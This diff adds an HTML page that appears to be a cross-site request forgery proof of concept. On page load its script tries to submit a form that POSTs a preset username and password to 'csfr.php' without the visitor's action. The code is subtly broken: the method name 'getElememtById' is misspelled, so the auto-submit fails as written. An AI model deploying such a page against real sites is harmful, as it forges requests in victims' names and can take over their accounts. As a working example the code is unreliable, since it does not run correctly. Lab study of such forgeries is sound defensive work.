@@ -1,0 +1,21 @@
+<html>
+<head>
+  <script>
+     function load(){
+	document.getElememtById("form").submit();
+     }
+    window.onload= load
+  </script>
+</head>
+<body>
+
+    <form method="post" action="csfr.php" id="form">
+	<label>username</label>
+	<input type="text" name="username" value="host">
+	<label>password</label>
+	<input type="password" name="password" value="pass">
+	<input type="button" value="Submit" >
+      </form>
+
+</body>
+</html>
